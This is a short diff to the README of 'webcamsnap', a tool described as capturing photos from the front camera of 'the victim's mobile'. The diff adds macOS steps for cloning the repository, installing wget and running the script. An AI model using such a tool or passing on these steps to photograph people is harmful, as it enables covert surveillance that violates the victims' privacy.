@@ -8,15 +8,12 @@ This tool capture the photo of the front camera of the victim's mobile when the 
 - bash install.sh
 - bash webcamsnap.sh
 
-
-
-
-
-
-
-
-
-
+# Steps to run this tool on mac:
+- git clone https://github.com/krishpranav/webcamsnap
+- cd webcamsnap
+- sudo chmod +x *
+- brew install wget
+- bash webcamsnap.sh
 
 
 
